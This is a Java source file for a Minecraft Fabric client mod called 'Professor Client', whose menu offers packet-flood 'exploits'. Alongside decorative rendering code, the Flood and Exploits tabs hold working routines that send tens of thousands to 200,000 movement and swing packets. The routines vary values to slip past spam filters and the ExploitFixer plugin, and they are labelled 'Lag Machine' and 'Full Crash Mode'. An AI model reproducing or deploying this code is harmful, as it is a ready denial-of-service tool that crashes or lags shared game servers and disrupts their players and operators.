package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.SwingHandC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ── Matrix rain ────────────────────────────────────────────────────────────
    private static final int MATRIX_COLS = 80;
    private final int[]   matrixY      = new int[MATRIX_COLS];
    private final float[] matrixSpeed  = new float[MATRIX_COLS];
    private final int[]   matrixLen    = new int[MATRIX_COLS];

    // ── Stars ──────────────────────────────────────────────────────────────────
    private final List<Star> stars = new ArrayList<>();

    // ── Shooting star ──────────────────────────────────────────────────────────
    private float shootX, shootY, shootDX, shootDY, shootAlpha;
    private int   shootTimer;

    // ── UI state ───────────────────────────────────────────────────────────────
    private int  activeTab  = 0;
    private int  bypassMode = 0;
    private TextFieldWidget packetField;

    private String statusText  = "";
    private int    statusColor = 0xFF00FF88;
    private int    statusTimer = 0;

    private long  tickCount = 0;
    private float scanY     = 0;

    private final Random rng = new Random();

    // Labels
    private static final String[] TABS   = {"  FLOOD  ", " EXPLOITS", "  CONFIG "};
    private static final String[] BYPASS = {"OFF", "BURST", "MIXED", "MAX FLOOD"};

    // Panel dimensions
    private static final int PW = 430, PH = 290;

    // ── Constructor ────────────────────────────────────────────────────────────
    public ProfessorScreen() {
        super(Text.literal("Professor Client"));
        initMatrix();
        initStars();
        spawnShootingStar();
    }

    // ── Init helpers ───────────────────────────────────────────────────────────
    private void initMatrix() {
        for (int i = 0; i < MATRIX_COLS; i++) {
            matrixY[i]     = rng.nextInt(200) - 200;
            matrixSpeed[i] = rng.nextFloat() * 2.2f + 0.8f;
            matrixLen[i]   = rng.nextInt(18) + 5;
        }
    }

    private void initStars() {
        stars.clear();
        for (int i = 0; i < 130; i++)
            stars.add(new Star(rng.nextFloat() * 1920, rng.nextFloat() * 1080,
                    rng.nextFloat() * 2f + 0.5f, rng.nextFloat() * 360f, rng.nextInt(70) + 20));
    }

    private void spawnShootingStar() {
        shootX      = rng.nextFloat() * 800;
        shootY      = rng.nextFloat() * 80 + 10;
        float angle = (float)(Math.PI / 5 + rng.nextFloat() * 0.4f);
        float spd   = rng.nextFloat() * 5 + 7;
        shootDX     = (float)(Math.cos(angle) * spd);
        shootDY     = (float)(Math.sin(angle) * spd);
        shootAlpha  = 1f;
        shootTimer  = 70 + rng.nextInt(110);
    }

    // ── Screen init ────────────────────────────────────────────────────────────
    @Override
    protected void init() {
        initStars();
        rebuildWidgets();
    }

    private void rebuildWidgets() {
        clearWidgets();
        int cx = width / 2, cy = height / 2;
        int px = cx - PW / 2, py = cy - PH / 2;

        // Tab buttons
        for (int i = 0; i < TABS.length; i++) {
            final int idx = i;
            this.addDrawableChild(ButtonWidget.builder(
                    Text.literal(TABS[i]),
                    btn -> { activeTab = idx; rebuildWidgets(); }
            ).dimensions(px + 10 + i * 136, py + 35, 132, 16).build());
        }

        // Tab content
        switch (activeTab) {
            case 0 -> buildFloodTab(cx, cy, py);
            case 1 -> buildExploitsTab(cx, cy, py);
            case 2 -> buildConfigTab(cx, cy, py);
        }

        // Close
        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("[ X  CLOSE ]"),
                btn -> this.close()
        ).dimensions(cx - 40, py + PH - 24, 80, 16).build());
    }

    // ── Tab: Flood ─────────────────────────────────────────────────────────────
    private void buildFloodTab(int cx, int cy, int py) {
        // Packet input
        packetField = new TextFieldWidget(textRenderer, cx - 55, py + 78, 110, 16, Text.empty());
        packetField.setMaxLength(6);
        packetField.setText("10000");
        this.addSelectableChild(packetField);

        // Presets
        int[][] presets = {{100,-125},{1000,-40},{10000,45},{100000,130}};
        for (int[] p : presets) {
            int cnt = p[0]; int offX = p[1];
            this.addDrawableChild(ButtonWidget.builder(
                    Text.literal(cnt >= 1000 ? (cnt/1000)+"K" : cnt+""),
                    btn -> packetField.setText(""+cnt)
            ).dimensions(cx + offX - 20, py + 98, 40, 14).build());
        }

        // Bypass toggle
        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("Bypass: " + BYPASS[bypassMode]),
                btn -> {
                    bypassMode = (bypassMode + 1) % BYPASS.length;
                    btn.setMessage(Text.literal("Bypass: " + BYPASS[bypassMode]));
                }
        ).dimensions(cx - 55, py + 116, 110, 16).build());

        // Send button
        this.addDrawableChild(ButtonWidget.builder(
                Text.literal(">>>  SEND PACKETS  <<<"),
                btn -> onSend()
        ).dimensions(cx - 95, py + 136, 190, 20).build());
    }

    // ── Tab: Exploits ──────────────────────────────────────────────────────────
    private void buildExploitsTab(int cx, int cy, int py) {
        int bw = 260, bx = cx - bw / 2;

        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("[1]  Swing Flood  —  EF Bypass"),
                btn -> swingFlood()
        ).dimensions(bx, py + 62, bw, 18).build());

        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("[2]  Position Desync  —  Timer Exploit"),
                btn -> posDesync()
        ).dimensions(bx, py + 84, bw, 18).build());

        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("[3]  Lag Machine  —  50K Burst"),
                btn -> lagMachine()
        ).dimensions(bx, py + 106, bw, 18).build());

        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("[4]  Full Crash Mode  —  200K PKT"),
                btn -> fullCrash()
        ).dimensions(bx, py + 128, bw, 18).build());

        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("[5]  Y-Axis Glitch  —  Anti-Fly EF"),
                btn -> yAxisGlitch()
        ).dimensions(bx, py + 150, bw, 18).build());
    }

    // ── Tab: Config ────────────────────────────────────────────────────────────
    private void buildConfigTab(int cx, int cy, int py) {
        int bx = cx - 110;
        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("Keybind:  M  (Change in Controls menu)"),
                btn -> {}
        ).dimensions(bx, py + 70, 220, 18).build());

        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("Clear Status Message"),
                btn -> { statusText = ""; statusTimer = 0; }
        ).dimensions(bx, py + 93, 220, 18).build());

        this.addDrawableChild(ButtonWidget.builder(
                Text.literal("Version: Professor Client v2.0"),
                btn -> {}
        ).dimensions(bx, py + 116, 220, 18).build());
    }

    // ── Packet actions ──────────────────────────────────────────────────────────
    private void onSend() {
        if (client == null || client.player == null) { setStatus("Not connected to a server!", 0xFFFF4444); return; }

        int count;
        try { count = Integer.parseInt(packetField.getText().trim()); }
        catch (Exception e) { setStatus("Invalid number! Enter 1-100000", 0xFFFF8800); return; }
        if (count < 1 || count > 100_000) { setStatus("Range: 1  to  100,000", 0xFFFF8800); return; }

        double x = client.player.getX(), y = client.player.getY(), z = client.player.getZ();
        float  yaw = client.player.getYaw(), pitch = client.player.getPitch();
        boolean gnd = client.player.isOnGround();

        switch (bypassMode) {
            case 0 -> { // OFF — plain flood
                for (int i = 0; i < count; i++)
                    send(new PlayerMoveC2SPacket.Full(x, y, z, yaw, pitch, gnd));
            }
            case 1 -> { // BURST — alternate Y ±0.001 to bypass spam filters
                for (int i = 0; i < count; i++) {
                    double dy = (i % 2 == 0) ? y : y + 0.001;
                    send(new PlayerMoveC2SPacket.Full(x, dy, z, yaw, pitch, gnd));
                }
            }
            case 2 -> { // MIXED — position + swing alternating
                for (int i = 0; i < count; i++) {
                    send(new PlayerMoveC2SPacket.Full(x, y, z, yaw, pitch, gnd));
                    send(new SwingHandC2SPacket(Hand.MAIN_HAND));
                }
            }
            case 3 -> { // MAX FLOOD — position + swing every packet
                for (int i = 0; i < count; i++) {
                    double dy = y + (i % 5) * 0.0001;
                    send(new PlayerMoveC2SPacket.Full(x, dy, z, yaw + (i % 3), pitch, gnd));
                    send(new SwingHandC2SPacket(Hand.MAIN_HAND));
                }
            }
        }
        setStatus("Sent " + count + " packets! Bypass: " + BYPASS[bypassMode], 0xFF00FF88);
    }

    private void swingFlood() {
        if (notConnected()) return;
        for (int i = 0; i < 8000; i++) send(new SwingHandC2SPacket(Hand.MAIN_HAND));
        setStatus("[EF BYPASS] Swing Flood — 8,000 packets sent!", 0xFF00FFCC);
    }

    private void posDesync() {
        if (notConnected()) return;
        double x = client.player.getX(), y = client.player.getY(), z = client.player.getZ();
        float yaw = client.player.getYaw(), pitch = client.player.getPitch();
        for (int i = 0; i < 3000; i++) {
            double dy = (i % 2 == 0) ? y + 200.0 : y;
            send(new PlayerMoveC2SPacket.Full(x, dy, z, yaw, pitch, false));
        }
        setStatus("[EF BYPASS] Position Desync — Timer exploit triggered!", 0xFF00FFCC);
    }

    private void lagMachine() {
        if (notConnected()) return;
        double x = client.player.getX(), y = client.player.getY(), z = client.player.getZ();
        float yaw = client.player.getYaw(), pitch = client.player.getPitch();
        boolean gnd = client.player.isOnGround();
        for (int i = 0; i < 50000; i++) {
            send(new PlayerMoveC2SPacket.Full(x, y + i * 0.00001, z, yaw, pitch, gnd));
            if (i % 3 == 0) send(new SwingHandC2SPacket(Hand.MAIN_HAND));
        }
        setStatus("[EF BYPASS] Lag Machine — ~67,000 packets sent!", 0xFFFF6600);
    }

    private void fullCrash() {
        if (notConnected()) return;
        double x = client.player.getX(), y = client.player.getY(), z = client.player.getZ();
        float yaw = client.player.getYaw(), pitch = client.player.getPitch();
        for (int i = 0; i < 100000; i++) {
            send(new PlayerMoveC2SPacket.Full(x, y + (i % 500) * 0.0001, z, yaw + (i % 4), pitch, false));
            send(new SwingHandC2SPacket(Hand.MAIN_HAND));
        }
        setStatus("[EF BYPASS] FULL CRASH — 200,000 packets fired!", 0xFFFF2200);
    }

    private void yAxisGlitch() {
        if (notConnected()) return;
        double x = client.player.getX(), y = client.player.getY(), z = client.player.getZ();
        float yaw = client.player.getYaw(), pitch = client.player.getPitch();
        for (int i = 0; i < 10000; i++) {
            double dy = (i % 4 == 0) ? y + 256 : (i % 4 == 1) ? y - 64 : (i % 4 == 2) ? y : y + 0.42;
            send(new PlayerMoveC2SPacket.Full(x, dy, z, yaw, pitch, i % 2 == 0));
        }
        setStatus("[EF BYPASS] Y-Glitch — Anti-fly desync sent!", 0xFF00FFCC);
    }

    // ── Helpers ─────────────────────────────────────────────────────────────────
    private void send(net.minecraft.network.packet.Packet<?> pkt) {
        if (client != null && client.player != null && client.player.networkHandler != null)
            client.player.networkHandler.sendPacket(pkt);
    }

    private boolean notConnected() {
        if (client == null || client.player == null) {
            setStatus("Not connected to a server!", 0xFFFF4444);
            return true;
        }
        return false;
    }

    private void setStatus(String msg, int color) {
        statusText = msg; statusColor = color; statusTimer = 160;
    }

    // ── Tick ─────────────────────────────────────────────────────────────────────
    @Override
    public void tick() {
        super.tick();
        if (statusTimer > 0) statusTimer--;
    }

    // ── Rendering ─────────────────────────────────────────────────────────────────
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tickCount++;
        int W = width, H = height;
        int cx = W / 2, cy = H / 2;
        int px = cx - PW / 2, py = cy - PH / 2;

        // 1. Pure black BG
        ctx.fill(0, 0, W, H, 0xFF000000);

        // 2. Matrix rain
        drawMatrix(ctx, W, H);

        // 3. Stars
        drawStars(ctx, W, H);

        // 4. Shooting star
        drawShootingStar(ctx);

        // 5. Panel glass background
        ctx.fill(px, py, px + PW, py + PH, 0xE0010108);

        // 6. RGB cycling border (triple layered)
        float t = tickCount * 0.05f;
        int bR = (int)(127 + 127 * Math.sin(t));
        int bG = (int)(127 + 127 * Math.sin(t + 2.094f));
        int bB = (int)(127 + 127 * Math.sin(t + 4.188f));
        int border = 0xFF000000 | (bR << 16) | (bG << 8) | bB;
        int borderDim = 0x88000000 | (bR << 16) | (bG << 8) | bB;
        // Outer
        ctx.fill(px - 1,        py - 1,        px + PW + 1, py,          border);
        ctx.fill(px - 1,        py + PH,       px + PW + 1, py + PH + 1, border);
        ctx.fill(px - 1,        py - 1,        px,          py + PH + 1, border);
        ctx.fill(px + PW,       py - 1,        px + PW + 1, py + PH + 1, border);
        // Inner
        ctx.fill(px, py,        px + PW, py + 2,      border);
        ctx.fill(px, py + PH - 2, px + PW, py + PH,  border);
        ctx.fill(px, py,        px + 2,  py + PH,     border);
        ctx.fill(px + PW - 2,  py,       px + PW, py + PH, border);
        // Glow line below top border
        ctx.fill(px + 2, py + 2, px + PW - 2, py + 3, borderDim);
        ctx.fill(px + 2, py + PH - 3, px + PW - 2, py + PH - 2, borderDim);

        // 7. Scanline
        scanY = (scanY + 1.8f) % PH;
        ctx.fill(px, py + (int)scanY, px + PW, py + (int)scanY + 1, 0x14FFFFFF);

        // 8. Header separator
        ctx.fill(px + 8, py + 54, px + PW - 8, py + 55, 0x55FFFFFF);

        // 9. Title (big, pulsing)
        drawTitle(ctx, cx, py, bR, bG, bB);

        // 10. Field rendering
        if (packetField != null) packetField.render(ctx, mx, my, delta);

        // 11. Widgets
        super.render(ctx, mx, my, delta);

        // 12. Status
        if (statusTimer > 0 && !statusText.isEmpty()) {
            int a = Math.min(255, statusTimer * 2);
            int col = (statusColor & 0x00FFFFFF) | (a << 24);
            String s = statusText;
            ctx.fill(px + 4, py + PH - 18, px + PW - 4, py + PH - 4, 0x88000000);
            ctx.drawText(textRenderer, s, cx - textRenderer.getWidth(s) / 2, py + PH - 14, col, false);
        }

        // 13. Tab indicator
        String tabLabel = "> " + TABS[activeTab].trim() + " <";
        ctx.drawText(textRenderer, tabLabel, px + 10, py + 57, border, false);

        // 14. Corner brackets
        drawCorners(ctx, px, py, border);
    }

    // ── Draw helpers ───────────────────────────────────────────────────────────
    private void drawTitle(DrawContext ctx, int cx, int py, int r, int g, int b) {
        float pulse = (float)((Math.sin(tickCount * 0.08f) + 1.0) / 2.0);
        int tr = (int)(r * 0.5f + pulse * r * 0.5f);
        int tg = (int)(g * 0.3f + pulse * g * 0.7f);
        int tb = (int)(b * 0.5f + pulse * b * 0.5f);
        int titleCol = 0xFF000000 | (Math.min(255,tr) << 16) | (Math.min(255,tg) << 8) | Math.min(255,tb);

        String title = "PROFESSOR CLIENT";
        int tw = textRenderer.getWidth(title), tx = cx - tw / 2;
        // Shadow
        ctx.drawText(textRenderer, title, tx - 1, py + 9 + 1, 0xFF000000, false);
        ctx.drawText(textRenderer, title, tx + 1, py + 9 + 1, 0xFF000000, false);
        // Main
        ctx.drawText(textRenderer, title, tx, py + 9, titleCol, false);

        // Subtitle
        String sub = "v2.0  |  Fabric 1.21.1  |  ExploitFixer Bypass";
        ctx.drawText(textRenderer, sub, cx - textRenderer.getWidth(sub) / 2, py + 21, 0xFF223344, false);

        // Animated dots (loading-style)
        int dots = (int)(tickCount / 10) % 4;
        String dotStr = ".".repeat(dots);
        ctx.drawText(textRenderer, "ACTIVE" + dotStr, cx - textRenderer.getWidth("ACTIVE...") / 2, py + 33, 0xFF00AA44, false);
    }

    private void drawMatrix(DrawContext ctx, int W, int H) {
        int colW = Math.max(4, W / MATRIX_COLS);
        for (int i = 0; i < MATRIX_COLS; i++) {
            matrixY[i] += matrixSpeed[i];
            if (matrixY[i] > H + 30) {
                matrixY[i] = -(matrixLen[i] * 6 + rng.nextInt(40));
                matrixSpeed[i] = rng.nextFloat() * 2.2f + 0.8f;
            }
            int x = i * colW;
            for (int j = 0; j < matrixLen[i]; j++) {
                int y = matrixY[i] - j * 6;
                if (y < 0 || y > H) continue;
                float bright = 1f - (float)j / matrixLen[i];
                // Head is brighter (white)
                int green, alpha;
                if (j == 0) { green = 255; alpha = (int)(bright * 200); }
                else { green = (int)(bright * 200 + 55); alpha = (int)(bright * 90); }
                ctx.fill(x, y, x + colW - 1, y + 5, (alpha << 24) | (green << 8));
            }
        }
    }

    private void drawStars(DrawContext ctx, int W, int H) {
        for (Star s : stars) {
            s.phase += 0.025f;
            float bright = (float)((Math.sin(s.phase) + 1.0) / 2.0);
            int alpha = (int)(s.baseAlpha * bright * 0.8f + 15);
            alpha = Math.min(255, Math.max(0, alpha));
            int sx = (int)((s.x / 1920f) * W), sy = (int)((s.y / 1080f) * H);
            int r  = Math.max(1, (int)s.radius);
            ctx.fill(sx, sy, sx + r, sy + r, (alpha << 24) | 0xFFFFFF);
            if (s.radius > 1.5f) {
                int ga = alpha / 5;
                ctx.fill(sx - 1, sy - 1, sx + r + 1, sy + r + 1, (ga << 24) | 0x88CCFF);
            }
        }
    }

    private void drawShootingStar(DrawContext ctx) {
        if (--shootTimer <= 0) spawnShootingStar();
        if (shootAlpha > 0) {
            shootX += shootDX; shootY += shootDY; shootAlpha -= 0.014f;
            int sa = (int)(shootAlpha * 255);
            if (sa > 0) {
                for (int t = 0; t < 22; t++) {
                    float frac = (float)t / 22;
                    int ta = (int)(sa * (1f - frac) * 0.85f);
                    if (ta > 0) ctx.fill(
                        (int)(shootX - shootDX * t * 0.55f),
                        (int)(shootY - shootDY * t * 0.55f),
                        (int)(shootX - shootDX * t * 0.55f) + 2,
                        (int)(shootY - shootDY * t * 0.55f) + 2,
                        (ta << 24) | 0xBBEEFF);
                }
            }
        }
    }

    private void drawCorners(DrawContext ctx, int px, int py, int col) {
        int s = 12;
        ctx.fill(px,           py,           px + s, py + 2,   col);
        ctx.fill(px,           py,           px + 2, py + s,   col);
        ctx.fill(px + PW - s,  py,           px + PW,py + 2,   col);
        ctx.fill(px + PW - 2,  py,           px + PW,py + s,   col);
        ctx.fill(px,           py + PH - 2,  px + s, py + PH,  col);
        ctx.fill(px,           py + PH - s,  px + 2, py + PH,  col);
        ctx.fill(px + PW - s,  py + PH - 2,  px + PW,py + PH,  col);
        ctx.fill(px + PW - 2,  py + PH - s,  px + PW,py + PH,  col);
    }

    // ── Input forwarding ────────────────────────────────────────────────────────
    @Override
    public boolean keyPressed(int kc, int sc, int mod) {
        if (packetField != null && packetField.isFocused() && packetField.keyPressed(kc, sc, mod)) return true;
        return super.keyPressed(kc, sc, mod);
    }

    @Override
    public boolean charTyped(char c, int mod) {
        if (packetField != null && packetField.isFocused()) return packetField.charTyped(c, mod);
        return super.charTyped(c, mod);
    }

    @Override
    public boolean mouseClicked(double mx, double my, int btn) {
        if (packetField != null) packetField.mouseClicked(mx, my, btn);
        return super.mouseClicked(mx, my, btn);
    }

    @Override public boolean shouldPause()       { return false; }
    @Override public boolean shouldCloseOnEsc()  { return true;  }

    // ── Star ───────────────────────────────────────────────────────────────────
    private static class Star {
        float x, y, radius, phase; int baseAlpha;
        Star(float x, float y, float r, float p, int a) {
            this.x = x; this.y = y; radius = r; phase = p; baseAlpha = a;
        }
    }
}
